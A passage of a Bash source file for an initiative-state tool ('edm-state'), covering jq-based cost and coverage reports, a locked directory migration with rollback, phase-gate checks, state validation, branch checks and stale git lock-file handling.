          | "  \($phase_label | .[0:10])  \(($v.duration_seconds // 0))s\(if ($v.duration_seconds // 0) < 100 then "       " else "     " end)  $\(($v.estimated_cost_usd // 0))\(if ($v.estimated_cost_usd // 0) < 10 then "        " else "      " end)  $\(($v.human_baseline_usd // 0))\(if ($v.human_baseline_usd // 0) < 100 then "        " else "      " end)  \(if ($v.estimated_cost_usd // 0) > 0 and ($v.human_baseline_usd // 0) > 0 then ((($v.human_baseline_usd // 0) / ($v.estimated_cost_usd // 1)) | tostring | .[0:5]) + "x" else "n/a" end)\(if ($v.estimated_cost_usd // 0) > 0 and ($v.human_baseline_usd // 0) > 0 then "    " else "        " end)  \(($v.tokens.input // 0))/\(($v.tokens.output // 0))\(if (($v.tokens.input // 0) + ($v.tokens.output // 0)) < 1000 then "        " else "     " end)  \($v.model_used // "?")"
        ' "$state"
        echo
        jq -r '
          [.phase_durations[] | .estimated_cost_usd // 0] as $costs |
          [.phase_durations[] | .human_baseline_usd // 0] as $humans |
          [.phase_durations[] | .duration_seconds // 0] as $secs |
          ($costs | add // 0) as $tc |
          ($humans | add // 0) as $th |
          ($secs | add // 0) as $ts |
          "  Total: \($ts)s  |  Claude: $\($tc)  |  Human baseline (ESTIMATE): $\($th)  |  Savings: " +
            (if $tc > 0 and $th > 0 then "\(($th / $tc) | tostring | .[0:6])x cheaper" else "n/a" end)
        ' "$state"
        echo "  (Human baseline is an ESTIMATE derived from Phase Timing Guidelines median hours x \$${HUMAN_HOURLY_RATE_USD}/hr -- not a measured cost.)"
      else
        printf "  %-10s  %-10s  %-12s  %-12s  %-10s\n" "Phase" "Duration" "Claude Cost" "Tokens (i/o)" "Model"
        printf "  %-10s  %-10s  %-12s  %-12s  %-10s\n" "-----" "--------" "-----------" "------------" "-----"
        jq -r '
          .phase_durations
          | to_entries
          | sort_by(.key)
          | .[]
          | .key as $k
          | .value as $v
          | ("Phase " + ($k | sub("_phase$"; ""))) as $phase_label
          | "  \($phase_label | .[0:10])  \(($v.duration_seconds // 0))s\(if ($v.duration_seconds // 0) < 100 then "       " else "     " end)  $\(($v.estimated_cost_usd // 0))\(if ($v.estimated_cost_usd // 0) < 10 then "        " else "      " end)  \(($v.tokens.input // 0))/\(($v.tokens.output // 0))\(if (($v.tokens.input // 0) + ($v.tokens.output // 0)) < 1000 then "        " else "     " end)  \($v.model_used // "?")"
        ' "$state"
        echo
        jq -r '
          [.phase_durations[] | .estimated_cost_usd // 0] as $costs |
          [.phase_durations[] | .duration_seconds // 0] as $secs |
          ($costs | add // 0) as $tc |
          ($secs | add // 0) as $ts |
          "  Total: \($ts)s  |  Claude: $\($tc)"
        ' "$state"
      fi
      echo
      # ---- Code Audit: per-round cost (EDMV3-T51 AC6) + rounds-run/lenses-per-round summary
      # (EDMV3-T53 AC8) -- one section, both tickets read the same audit_rounds data, so it is
      # built once here rather than edited twice. Rendered only when at least one round has a
      # recorded completion; omitted entirely (not rendered empty) when audit-round-start has
      # run but audit-round-complete never has, or when no audit round has ever started
      # (EDMV3-T51 AC7: a legacy or bare-integer audit_rounds shape renders without error via
      # the same coerce_round_entry widening every other audit_rounds reader uses).
      local has_round_data
      has_round_data="$(jq -r "${AUDIT_ROUND_COERCE_JQ_DEF}"'
        [(.audit_rounds // {}) | to_entries[] | (.value | coerce_round_entry).rounds[] | select(.completed_at != null)] | length
      ' "$state" 2>/dev/null || echo 0)"
      if [[ "$has_round_data" -gt 0 ]]; then
        echo "## Code Audit -- per-round cost"
        echo
        while IFS=$'\t' read -r car_type car_rounds_run; do
          [[ -n "$car_type" ]] || continue
          echo "  ${car_type}: ${car_rounds_run} rounds run"
        done < <(jq -r "${AUDIT_ROUND_COERCE_JQ_DEF}"'
          (.audit_rounds // {}) | to_entries[] |
          .key as $t | (.value | coerce_round_entry) |
          select((.rounds | map(select(.completed_at != null)) | length) > 0) |
          [$t, ((.rounds | map(select(.completed_at != null)) | length) | tostring)] | @tsv
        ' "$state" 2>/dev/null)
        echo
        printf "  %-8s  %-6s  %-8s  %-10s  %-10s  %-12s\n" "Type" "Round" "Lenses" "Duration" "Cost" "Model"
        printf "  %-8s  %-6s  %-8s  %-10s  %-10s  %-12s\n" "----" "-----" "------" "--------" "----" "-----"
        while IFS=$'\t' read -r ar_type ar_round ar_lenses ar_dur ar_cost ar_model; do
          [[ -n "$ar_type" ]] || continue
          printf "  %-8s  %-6s  %-8s  %-10s  %-10s  %-12s\n" "$ar_type" "$ar_round" "$ar_lenses" "${ar_dur}s" "\$${ar_cost}" "$ar_model"
        done < <(jq -r "${AUDIT_ROUND_COERCE_JQ_DEF}"'
          (.audit_rounds // {}) | to_entries[] |
          .key as $t | (.value | coerce_round_entry).rounds[] |
          select(.completed_at != null) |
          [$t, (.round|tostring), ((.lenses // []) | length | tostring), ((.duration_seconds // 0)|tostring), ((.estimated_cost_usd // 0)|tostring), (.model_used // "?")] | @tsv
        ' "$state" 2>/dev/null)
        echo "  (lenses per round shown in the Lenses column above; round_type full = all 11 lenses)"
        echo
      fi
      # ---- Tiered vs untiered lens cost (EDMV3-T53 AC9) ------------------------------------
      # Renders only where tiering data exists; omitted (not rendered empty) where it does not.
      # No producer of `.tiering_results` exists yet -- EDMV3-T48 (a separate, not-in-this-
      # batch ticket) is the measurement this section reads; today every initiative has none,
      # so this section correctly never renders until T48 lands and populates the field. The
      # anticipated shape (documented here so T48 has a concrete target rather than inventing
      # its own): .tiering_results = [{lens_set, tiered_cost_usd, untiered_cost_usd}, ...].
      local has_tiering_data
      has_tiering_data="$(jq -r '(.tiering_results // []) | length' "$state" 2>/dev/null || echo 0)"
      if [[ "$has_tiering_data" -gt 0 ]]; then
        echo "## Tiered vs Untiered Lens Cost"
        echo
        printf "  %-20s  %-14s  %-14s\n" "Lens Set" "Tiered Cost" "Untiered Cost"
        printf "  %-20s  %-14s  %-14s\n" "--------" "-----------" "-------------"
        jq -r '
          (.tiering_results // [])[] |
          "  \(.lens_set // "?" | tostring | .[0:20])  $\(.tiered_cost_usd // 0)  $\(.untiered_cost_usd // 0)"
        ' "$state" 2>/dev/null
        echo
      fi
      # Gate review time section (only shown when at least one gate is approved)
      # gate_review_seconds = approved_at(gate_N) - phase_complete_timestamp(gated_phase)
      # Gated phases: gate 1 -> phase 1, gate 2 -> phase 3, gate 3 -> phase 5
      local has_gates has_compliance_gate has_code_audit_gate
      has_gates="$(jq -r '(.gates_approved // []) | length' "$state" 2>/dev/null || echo 0)"
      has_compliance_gate="$(jq -r '.compliance_gate_approved // false' "$state" 2>/dev/null || echo false)"
      has_code_audit_gate="$(jq -r '.code_audit_converged // false' "$state" 2>/dev/null || echo false)"
      if [[ "$has_gates" -gt 0 || "$has_compliance_gate" == "true" || "$has_code_audit_gate" == "true" ]]; then
        echo "## Gate Review Times"
        echo
        jq -r '
          # Bind the full state object so it remains accessible after generator iteration.
          . as $state |

          # gated_phase_key: returns the phase_durations key for the phase preceding each gate.
          def gated_phase_key(g):
            if g == 1 then "1_phase"
            elif g == 2 then "3_phase"
            elif g == 3 then "5_phase"
            else null end;

          # phase_complete_epoch: returns epoch seconds for when the gated phase completed.
          # Falls back to started_at + duration_seconds if completed_at is missing.
          def phase_complete_epoch($s; key):
            $s.phase_durations[key] as $pd |
            if $pd == null then null
            elif ($pd.completed_at != null and $pd.completed_at != "") then
              ($pd.completed_at | fromdateiso8601)
            elif ($pd.started_at != null and $pd.started_at != "" and $pd.duration_seconds != null) then
              (($pd.started_at | fromdateiso8601) + $pd.duration_seconds)
            else null end;

          # dedicated_gate_row: renders one of the two dedicated-boolean gates (3.5 compliance,
          # code-audit) as its own row rather than folding it into the [1,2,3] array below --
          # each is a boolean field with sibling metadata scalars, not a gates_approved integer
          # entry (EDMV3-T08 AC8).
          def dedicated_gate_row(gate_label; approved_field; approved_at_field):
            (($state[approved_field] // false) == true) as $ok |
            if $ok != true then
              "  Gate \(gate_label) review:  n/a  (not yet approved)"
            else
              ($state[approved_at_field] // "") as $at |
              if $at == "" then
                "  Gate \(gate_label) review:  approved  (timestamp unknown)"
              else
                "  Gate \(gate_label) review:  approved  (\($at[:10]))"
              end
            end;

          (
            [1, 2, 3] | .[] as $g |
            (($state.gates_approved // []) | map(select(.gate == $g)) | first) as $approval |
            (gated_phase_key($g)) as $pk |
            (phase_complete_epoch($state; $pk)) as $complete_epoch |
            # Derive the phase number from the single gated_phase_key def above (CA-013)
            # rather than re-encoding the gate->phase map as a parallel literal.
            ((gated_phase_key($g)) | sub("_phase$"; "") | tonumber) as $gated_phase_num |
            if $approval == null then
              "  Gate \($g) review:  n/a  (not yet approved)"
            elif $complete_epoch == null then
              "  Gate \($g) review:  n/a  (phase \($gated_phase_num) completion time unknown)"
            else
              ($approval.approved_at | fromdateiso8601) as $approved_epoch |
              ($approved_epoch - $complete_epoch) as $diff |
              if $diff < 0 then
                "  Gate \($g) review:  n/a  (timestamp inconsistency)"
              else
                "  Gate \($g) review:  \($diff | floor)s  (approved \($approval.approved_at[:10]), phase \($gated_phase_num) completed \($state.phase_durations[$pk].completed_at // "unknown" | if . != "unknown" then .[:10] else . end))"
              end
            end
          ),
          dedicated_gate_row("3.5"; "compliance_gate_approved"; "compliance_gate_approved_at"),
          dedicated_gate_row("code-audit"; "code_audit_converged"; "code_audit_gate_approved_at")
        ' "$state" 2>/dev/null || echo "  (gate review data unavailable)"
        echo
      fi
      # Test coverage summary (if any recorded)
      local has_coverage has_epic_coverage
      has_coverage="$(jq -r '(.coverage_by_layer // {}) | length' "$state" 2>/dev/null || echo 0)"
      has_epic_coverage="$(jq -r '(.coverage_by_epic // {}) | length' "$state" 2>/dev/null || echo 0)"
      if [[ "$has_coverage" -gt 0 ]]; then
        echo "## Test Coverage"
        echo
        printf "  %-14s  %-10s  %-20s\n" "Layer" "Coverage" "Measured At"
        printf "  %-14s  %-10s  %-20s\n" "-----" "--------" "-----------"
        jq -r "${COVERAGE_LAYER_ROW_JQ_DEF}"'
          (.coverage_by_layer // {}) | to_entries[] | coverage_layer_row
        ' "$state" 2>/dev/null
        echo
      fi
      if [[ "$has_epic_coverage" -gt 0 ]]; then
        echo "## Per-Epic Test Coverage"
        echo
        printf "  %-15s  %-14s  %-10s\n" "Epic" "Layer" "Coverage"
        printf "  %-15s  %-14s  %-10s\n" "----" "-----" "--------"
        jq -r '
          (.coverage_by_epic // {}) | to_entries[] |
          .key as $epic | .value | to_entries[] |
          "  \($epic | . + (" " * (15 - length | if . < 0 then 0 else . end)))  \(.key | . + (" " * (14 - length | if . < 0 then 0 else . end)))  \(.value.pct)%"
        ' "$state" 2>/dev/null
        echo
      fi
      ;;
  esac
}

# ---- Migrate path (T42) ------------------------------------------------------
# migrate-path --product <name> --description <slug> <PREFIX>
# Relocates a flat initiative SRD/{PREFIX}/ to SRD/{PRODUCT}/{PREFIX}__{DESCRIPTION}/
# and updates product_name + initiative_description in state. Git-aware when tracked.

# _cmd_migrate_path_move_body <src> <dst> <lockbase>   (runs INSIDE with_state_lock;
# see cmd_migrate_path below, which acquires the lock and dispatches here)
# G17 (CA-206, replaces the G46 pre-rename cleanup this comment used to describe -- see
# _cmd_archive_move_body above for the full TOCTOU rationale this mirrors): rename FIRST, then
# remove the lockd names at the DESTINATION path once the move is verified. The lock names live
# inside the initiative directory itself, so they travel with git_aware_mv (and back again, on
# the rollback path below) automatically -- there is no window between "lockd removed" and
# "rename complete" for a fresh contender to mkdir a live lockdir at the SAME source path that
# with_state_lock's own later unconditional cleanup could then delete out from under it.
# G16/CA-304 (round 5): the destination's ".lock" FLOCK FILE itself is deliberately left in
# place, unlike _cmd_archive_move_body's identical-looking sweep above. Archive's exception is
# genuinely safe because the destination is permanently archived and no future caller ever
# targets that path again; migrate-path's destination is the opposite -- it is the new LIVE
# home, and rmw_state below locks it again moments later, while this function is still running
# INSIDE with_state_lock's own flock hold on that same file (fd 200 does not close until this
# body returns). Unlinking a flock target while a contender could re-create a new file at the
# same name is exactly the inode-reuse hazard CA-169's "never unlink the flock lockfile" default
# exists to prevent everywhere else in this file -- this site is not actually an exception to
# that default, and the comment that used to claim it was is corrected here.
_cmd_migrate_path_move_body() {
  local _src="$1" _dst="$2" _lockbase="$3"
  git_aware_mv "$_src" "$_dst"
  if [[ ! -f "${_dst}/.edm-state.json" ]]; then
    git_aware_mv "$_dst" "$_src"
    die "migrate-path: state file not found after move (rolled back): ${_dst}/.edm-state.json"
  fi
  local _dst_lockbase="${_dst}${_lockbase#"$_src"}"
  # G25 (CA-256): also sweep the G49 flock-timeout marker glob at the destination.
  rm -rf "${_dst_lockbase}.lockd"
  # G15/CA-256 (round 5): see _cmd_archive_move_body's identical fix above for why this glob is
  # looped with a per-file existence test rather than passed as a third, unquoted `rm -rf`
  # argument (word-splittable on any space in $_dst_lockbase). G17/CA-305 (round 5) moved the
  # marker's home to TMPDIR -- see the same function's comment for why this sweep is kept as a
  # backward-compatible cleanup regardless.
  local _migrate_timeout_marker
  for _migrate_timeout_marker in "${_dst_lockbase}".lock.timeout.*; do
    [[ -e "$_migrate_timeout_marker" ]] || continue
    rm -f "$_migrate_timeout_marker"
  done
}

# _cmd_migrate_path_rollback_body <dst> <src> <product-dir>   (runs INSIDE with_state_lock,
# mirroring the forward move above; see cmd_migrate_path's post-write-failure branch)
# G16/CA-304 (round 5): G46 wrapped the FORWARD rename in with_state_lock but left this
# post-failure ROLLBACK rename running bare -- the one directory move in this file with no lock
# held, against G46's own stated principle. A concurrent writer that acquired the destination
# lock in this post-failure window would have had its critical section renamed out from under
# it. Locked the same way the forward move is, on the file's CURRENT (destination) lockbase.
_cmd_migrate_path_rollback_body() {
  local _dst="$1" _src="$2" _product_dir="$3"
  git_aware_mv "$_dst" "$_src"
  # Remove the product directory only if this rollback leaves it empty -- rmdir fails
  # harmlessly (non-empty, or already gone) rather than needing a separate emptiness check,
  # and other initiatives may already live under this product directory from an earlier,
  # unrelated migrate-path call, which must never be destroyed here.
  rmdir "$_product_dir" 2>/dev/null || true
}

cmd_migrate_path() {
  require_jq
  local prefix="" product="" description=""
  # Flag parsing: accept --product/--description in any order with PREFIX positional.
  while [[ $# -gt 0 ]]; do
    case "$1" in
      --product)    [[ $# -ge 2 ]] || die "migrate-path: --product requires a value"; product="$2"; shift 2 ;;
      --description) [[ $# -ge 2 ]] || die "migrate-path: --description requires a value"; description="$2"; shift 2 ;;
      --*)          die "migrate-path: unknown flag $1" ;;
      *)            [[ -z "$prefix" ]] || die "migrate-path: unexpected extra argument: $1"; prefix="$1"; shift ;;
    esac
  done
  [[ -n "$prefix" ]] || die "usage: edm-state migrate-path --product <name> --description <slug> <PREFIX>"
  [[ -n "$product" ]] || die "migrate-path: --product is required"
  [[ -n "$description" ]] || die "migrate-path: --description is required"
  [[ "$product" =~ ^[A-Za-z0-9_-]+$ ]] || die "migrate-path: --product must contain only [A-Za-z0-9_-], got: '$product'"
  [[ "$description" =~ ^[A-Za-z0-9_-]+$ ]] || die "migrate-path: --description must contain only [A-Za-z0-9_-], got: '$description'"

  # Validate PREFIX format before it reaches any filesystem path (path-traversal guard, CA-002).
  # Matches the central state_file_for guard so legacy and product-scoped prefixes both pass.
  [[ "$prefix" =~ ^[A-Za-z0-9_-]+$ ]] || die "migrate-path: invalid PREFIX '${prefix}' (only alphanumeric, hyphen, underscore allowed)"

  # Resolve current (flat) source directory.
  local src dst
  src="${SRD_ROOT}/${prefix}"
  [[ -d "$src" ]] || die "migrate-path: source directory not found: $src"

  dst="${SRD_ROOT}/${product}/${prefix}__${description}"
  [[ ! -d "$dst" ]] || die "migrate-path: target directory already exists: $dst"

  # Create product subdirectory.
  mkdir -p "${SRD_ROOT}/${product}"

  # G46: hold the state lock across the initial rename, instead of moving the directory
  # (which may contain a live lockdir/lockfile from a concurrent with_state_lock caller)
  # with no lock of our own held. The locked body performs the rename itself and, on the
  # missing-state-file failure, rolls back and dies from inside its own subshell
  # (with_state_lock always runs its body in a subshell, so `die` here only ends that
  # subshell; the non-zero return then aborts this script the same way a bare `die`
  # outside the lock would have). It must NOT call rmw_state or take a second, nested
  # lock (with_state_lock is not reentrant).
  local migrate_lockbase="${src}/.edm-state"
  with_state_lock "$migrate_lockbase" _cmd_migrate_path_move_body "$src" "$dst" "$migrate_lockbase"

  # Update state through the locked/atomic/backup primitive (CA-001). After the move,
  # state_file_for "$prefix" glob-resolves the new product-scoped dir, so rmw_state targets it.
  # Roll the directory move back if the write fails.
  # G46: do NOT drop a carried-over .bak before attempting the write below -- if
  # rmw_state fails and the move is rolled back, a pre-existing .bak (from some earlier,
  # unrelated operation) is exactly the recovery artifact a human would reach for.
  # rmw_state's own _rmw_state_body already makes a fresh backup unconditionally as its
  # first step, so the stale one is naturally superseded on success without needing to
  # be pre-emptively deleted here (and, unlike a pre-emptive delete, is never destroyed
  # before we know whether this write will actually succeed).
  if ! rmw_state "$prefix" \
        '.product_name = $p | .initiative_description = $d | .last_updated = $t' \
        --arg p "$product" --arg d "$description" --arg t "$(now_utc)"; then
    # G16/CA-304 (round 5): lock this rollback rename the same way the forward one is, on the
    # file's current (destination) lockbase -- rmw_state's own lock on this same file was
    # already released by the time it returned above, so acquiring a fresh one here is safe.
    with_state_lock "${dst}/.edm-state" _cmd_migrate_path_rollback_body "$dst" "$src" "${SRD_ROOT}/${product}"
    die "migrate-path: state update failed (rolled back move): $prefix"
  fi

  echo "migrated ${prefix}: ${src} -> ${dst}"
  echo "set product_name=${product}, initiative_description=${description}"
}

# ---- Active initiatives (T35) -----------------------------------------------
# active-initiatives: list initiatives with current_phase in 1-6

cmd_active_initiatives() {
  [[ -d "$SRD_ROOT" ]] || { echo "(no SRD/ directory)"; return 0; }
  require_jq
  local found=0
  while IFS= read -r state; do
    local phase
    phase="$(jq -r '(.current_phase // 0) | if type == "number" then floor else 0 end' "$state" 2>/dev/null || echo 0)"
    if [[ "$phase" -ge 1 && "$phase" -le 6 ]]; then
      found=1
      local prefix last
      prefix="$(jq -r '.prefix' "$state" 2>/dev/null || echo unknown)"
      last="$(jq -r '.last_updated' "$state" 2>/dev/null || echo unknown)"
      printf "  %-12s  phase=%d  last_updated=%s\n" "$prefix" "$phase" "$last"
    fi
  done < <(list_state_files)
  [[ $found -eq 1 ]] || echo "  (no active initiatives)"
}

# ---- Gate enforcement (T27, completed EDMV3-T13) -----------------------------
# gate-check <PREFIX> <gated-command>
# Exits 0 if the gate prerequisite for <gated-command> is satisfied.
# Exits 1 with a human-readable error if the gate is not yet approved.
# Read-only -- never mutates state.
#
# Gated commands and their required gates (all eight phase-skill tokens resolve;
# EDMV3-T13 AC3):
#   plan                       -> no prerequisite gate (first phase-skill in the lifecycle)
#   srd | audit-srd            -> Gate 1 must be approved
#   tickets                    -> Gate 2 must be approved
#   audit-tickets | implement  -> Gate 3 must be approved
#   code-audit | verify-runtime -> Gate 3 must be approved
# Any other token is a hard error (EDMV3-T13 AC4) -- a typo in a hook or a Step 0
# block must not silently disable enforcement, which `*) return 0` did before this ticket.
#
# requires schema_version >= 1 (EDMV3-115, EDMV3-T09 AC10): this check's shape (gates,
# mode-derived terminal phase) is a wave-A guarantee. The three-valued warn-and-proceed
# degradation for a present-but-lower schema_version is defined by EDMV3-T09 as a
# contract; it is implemented end-to-end by EDMV3-T14, not here.

cmd_gate_check() {
  [[ $# -eq 2 ]] || die "usage: edm-state gate-check <PREFIX> <gated-command>"
  require_jq
  local prefix="$1" gated_cmd="$2"
  local state required_gate
  state="$(read_state "$prefix")"

  case "$gated_cmd" in
    plan)
      # No prerequisite gate for `plan` -- it is the first phase-skill in the lifecycle, so
      # this returns 0 explicitly here rather than reaching the hard-error default branch.
      return 0
      ;;
    srd|audit-srd)    required_gate=1 ;;
    tickets)          required_gate=2 ;;
    audit-tickets|implement) required_gate=3 ;;
    code-audit|verify-runtime) required_gate=3 ;;
    *)
      echo "edm-state gate-check: unknown gated command '${gated_cmd}'." >&2
      echo "Valid tokens: plan srd audit-srd tickets audit-tickets implement code-audit verify-runtime" >&2
      return 1
      ;;
  esac

  # Mode/skipped-phase awareness (EDMV3-T13 AC5): a gate whose feeding phase is in
  # skipped_phases, or beyond this lifecycle's terminal phase, is not required at all -- the
  # check passes without inspecting gates_approved. Uses the same required_gates_for_mode()
  # derivation as cmd_archive's code_audit_required_for_mode() sibling (EDMV3-T07), not a
  # second one.
  # requires schema_version >= 1 (EDMV3-T13 AC7 remediation): the real legacy signal is
  # absent schema_version, not a missing mode field -- a genuine pre-EDMV3 initiative (e.g.
  # SRD/.archived/EDMV2) already carries mode="standard" and would otherwise get full
  # enforcement instead of warn-and-proceed. mode == "null" is kept as a secondary guard for
  # a hand-edited state file missing mode entirely. Uses the shared schema_at_least()
  # three-valued helper (EDMV3-T14) rather than re-deriving the comparison.
  local mode schema_version_gc
  mode="$(echo "$state" | jq -r '.mode // "null"')"
  schema_version_gc="$(echo "$state" | jq -r '.schema_version // empty')"
  if [[ "$(schema_at_least "$schema_version_gc" 1)" == "0" || "$mode" == "null" ]]; then
    echo "edm-state gate-check: [warn] legacy initiative (no schema_version) -- skipping kernel gate enforcement" >&2
    record_degraded_check "$prefix" "gate-check:kernel-gate-enforcement" "no schema_version"
    return 0
  fi
  local lifecycle_mode skipped_phases_str required_gates_list
  lifecycle_mode="$(echo "$state" | jq -r '.lifecycle_mode // "standard"')"
  skipped_phases_str="$(echo "$state" | jq -r '[(.skipped_phases // [])[].phase] | join(" ")')"
  required_gates_list="$(required_gates_for_mode "$mode" "$lifecycle_mode" "$skipped_phases_str")"
  if ! printf '%s\n' "$required_gates_list" | grep -qx "$required_gate"; then
    return 0
  fi

  local approved
  approved="$(echo "$state" | jq -r --argjson g "$required_gate" '
    (.gates_approved // []) | map(select(.gate == $g)) | length
  ' 2>/dev/null || echo 0)"

  if [[ "$approved" -eq 0 ]]; then
    echo "edm-state gate-check: Gate ${required_gate} has not been approved for ${prefix}." >&2
    echo "Run /edm:orchestrator ${prefix} and approve Gate ${required_gate} before running /${gated_cmd}." >&2
    return 1
  fi

  # For implement: also enforce compliance_gate_approved when compliance_enabled=true.
  if [[ "$gated_cmd" == "implement" ]]; then
    local ce cga
    ce="$(echo "$state" | jq -r '.compliance_enabled // false')"
    if [[ "$ce" == "true" ]]; then
      cga="$(echo "$state" | jq -r '.compliance_gate_approved // false')"
      if [[ "$cga" != "true" ]]; then
        echo "edm-state gate-check: Gate 3.5 (compliance review) has not been approved for ${prefix}." >&2
        echo "Run /edm:orchestrator ${prefix} and approve Gate 3.5 before running /implement." >&2
        return 1
      fi
    fi
  fi

  return 0
}

# ---- Validate (T32, class split EDMV3-T05) -----------------------------------
# validate <PREFIX>
# Runs state_anomalies and prints every anomaly found, both classes. Exits 3 only
# when at least one "blocking"-class anomaly is present (EDMV3-T05 AC4); an
# "info"-only result is printed in full but exits 0 (EDMV3-T05 AC3) -- silence is
# never how an informational anomaly is handled. Never mutates state.

cmd_validate() {
  [[ $# -eq 1 ]] || die "usage: edm-state validate <PREFIX>"
  local prefix="$1"
  local anomalies
  anomalies="$(state_anomalies "$prefix")"
  if [[ -n "$anomalies" ]]; then
    echo "# State anomalies for $prefix:"
    echo
    echo "$anomalies"
    # A line's class is its first field (EDMV3-T05 AC2 four-field format). Only
    # "blocking" flips the exit code -- do not change the "3" value itself (it is
    # the established edm-state convention EDMV3-100 keeps).
    local line class blocking_count=0
    while IFS= read -r line; do
      [[ -n "$line" ]] || continue
      class="${line%% *}"
      [[ "$class" == "blocking" ]] && blocking_count=$((blocking_count + 1))
    done <<< "$anomalies"
    [[ $blocking_count -gt 0 ]] && return 3
    return 0
  fi
  echo "# State OK: no anomalies found for $prefix"
  return 0
}

# ---- Branch check (T35) ------------------------------------------------------
# branch-check <PREFIX>
# Verifies the current git branch matches the initiative_branch recorded in state.
# Exits 0 on match or when no initiative_branch is recorded (legacy state).
# Exits 1 with an advisory on mismatch.

cmd_branch_check() {
  [[ $# -eq 1 ]] || die "usage: edm-state branch-check <PREFIX>"
  local prefix="$1"
  require_jq
  local state initiative_branch current_branch
  state="$(read_state "$prefix")"
  initiative_branch="$(echo "$state" | jq -r '.initiative_branch // ""')"
  if [[ -z "$initiative_branch" ]]; then
    # Legacy state without initiative_branch -- no enforcement.
    return 0
  fi
  current_branch="$(git rev-parse --abbrev-ref HEAD 2>/dev/null || echo '')"
  if [[ -z "$current_branch" ]]; then
    echo "[warn] could not determine current git branch; skipping branch check" >&2
    return 0
  fi
  if [[ "$current_branch" != "$initiative_branch" ]]; then
    echo "edm-state branch-check: current branch '${current_branch}' does not match initiative_branch '${initiative_branch}'." >&2
    echo "Run: git checkout ${initiative_branch}" >&2
    return 1
  fi
  return 0
}

# ---- Record branch (T01) -----------------------------------------------------
# record-branch <PREFIX>
# Post-checkout correction for the edm-init branch handshake (F2a). `cmd_init` snapshots
# initiative_branch from HEAD *before* edm-init's branch-creation block runs, so a fresh
# initiative records the branch the user was on beforehand rather than the branch it ends
# up on. This command re-derives the value itself from `git rev-parse --abbrev-ref HEAD` at
# call time -- it does NOT accept a branch name as an argument -- so it always records the
# branch actually occupied, including on edm-init's warn-and-continue paths where checkout
# failed and the user stayed on the original branch. Deliberately NOT added to cmd_set's
# allowlist (AC6): initiative_branch stays a derived value, never a caller-supplied one.
# No-op (exit 0, no state write) outside a git worktree or when HEAD can't be resolved,
# so it is safe to call from edm-init unconditionally after the branch block.
cmd_record_branch() {
  [[ $# -eq 1 ]] || die "usage: edm-state record-branch <PREFIX>"
  local prefix="$1"
  require_jq
  git rev-parse --is-inside-work-tree >/dev/null 2>&1 || return 0
  local current_branch
  current_branch="$(git rev-parse --abbrev-ref HEAD 2>/dev/null || echo '')"
  [[ -n "$current_branch" ]] || return 0
  rmw_state "$prefix" '.initiative_branch = $b | .last_updated = $t' \
    --arg b "$current_branch" --arg t "$(now_utc)"
}

# ---- Git lock check (T36) ----------------------------------------------------
# git-lock-check
# Detects a stale .git/index.lock file and removes it if the holding process is gone.

# _git_lock_age_bucket <file> -- coarse, portable age description for <file>'s mtime,
# using only `find -mmin` (supported identically by GNU and BSD find). Deliberately
# avoids the GNU-vs-BSD `stat` flag divergence (`-c` on GNU, `-f` on BSD): this file
# must run unmodified on macOS and Linux, and that exact divergence point is one
# bin/tests/wave7-smoke.sh's T61 AC11 case asserts never appears anywhere in bin/
# outside edm-lint-artifacts' own sanctioned detection branch.
_git_lock_age_bucket() {
  local f="$1" bucket
  for bucket in 120 60 30 15 5 1; do
    if find "$f" -mmin "+${bucket}" 2>/dev/null | grep -q .; then
      echo "more than ${bucket} minute(s)"
      return 0
    fi
  done
  # G27 (CA-258): cmd_git_lock_check's actual removal gate below uses `find -mmin +0` (true at
  # roughly >=60s), one threshold finer than this loop's smallest bucket (`-mmin +1`, true only
  # at roughly >=120s). Without a matching "0" bucket here, a lock aged in the [60s,120s) window
  # fell through every bucket above to the "less than 1 minute" line even though the removal
  # gate had already judged it old enough to act on -- the printed age contradicted the action
  # the tool was about to take. This bucket uses the identical `-mmin +0` test so the two can
  # never disagree again.
  if find "$f" -mmin +0 2>/dev/null | grep -q .; then
    echo "at least 1 minute"
    return 0
  fi
  echo "less than 1 minute"
}

cmd_git_lock_check() {
  local git_dir
  # G6 (CA-251): resolve to an ABSOLUTE path via `--absolute-git-dir`, not the relative
  # `--git-dir`. The relative form prints the bare 4-character string ".git" from the normal
  # invocation point (the top of a work tree), which is not a repository-identifying scope at
  # all -- it is a fixed string every git worktree on the host shares.
  git_dir="$(git rev-parse --absolute-git-dir 2>/dev/null || echo '')"
  if [[ -z "$git_dir" ]]; then
    echo "not inside a git repository" >&2
    return 0
  fi
  local lock_file="${git_dir}/index.lock"
  if [[ ! -f "$lock_file" ]]; then
    echo "no .git/index.lock present"
    return 0
  fi

  # G43: print the lock's age and (below) whatever holder evidence is found BEFORE
  # acting, so a human reading the output can see the actual reasoning that led to
  # removal or refusal.
  local lock_age_desc
  lock_age_desc="$(_git_lock_age_bucket "$lock_file")"
  echo "found .git/index.lock (age: ${lock_age_desc})"

  # G43: age threshold gate FIRST, before any liveness probe at all. A lock file that
  # is not yet at least ~60 seconds old is never a removal candidate regardless of what
  # the liveness probe below would conclude -- a git process can legitimately hold the
  # lock for a few seconds mid-operation, and this closes the TOCTOU window a raced,
  # instantaneous liveness check alone left open.
  if find "$lock_file" -mmin +0 2>/dev/null | grep -q .; then
    : # older than ~60s -- fall through to the liveness probe below
  else
    echo "WARNING: .git/index.lock is less than a minute old; leaving in place -- a git process may be mid-operation" >&2
    return 1
  fi

  # G43: scope liveness detection to THIS repo specifically instead of the old bare,
  # exact-process-name pgrep match (itself no age check either), which both MISSES
  # legitimate holders whose process name isn't literally "git" (git-remote-https, an
  # IDE-embedded git, a wrapper-renamed git binary) and MATCHES an unrelated repo's
  # git process anywhere else on the host -- neither false negative nor false positive
  # is acceptable for a check that deletes a lock file. Prefer lsof scoped to the lock
  # file itself when available; fall back to a pgrep-plus-ps scan matched against this
  # repo's own absolute git-dir path.
  #
  # G6 (CA-251): the pgrep fallback previously self-matched on every invocation. `git_dir`
  # (now the absolute path from --absolute-git-dir above, not the bare 4-character relative
  # string ".git") is matched as a FIXED STRING, never an ERE: `pgrep -f` still treats its own
  # pattern as an ERE for CANDIDATE selection below (an ERE metacharacter in the path, e.g. a
  # literal '.' matching any character, can only add extra false-positive candidates), but the
  # actual classification is decided by piping literal command-line text through `grep -F`
  # against the same absolute path, so a candidate must contain that exact substring to survive.
  # Full command-line text is fetched via `ps -o pid=,args=` for each candidate PID rather than
  # via a `pgrep -a`/`-l` display flag: on macOS/BSD pgrep, `-a` means "include process
  # ancestors in the match list" -- a completely different feature from GNU procps' pgrep `-a`
  # ("list the full command line") -- and macOS `-l` alone prints only the bare process name, not
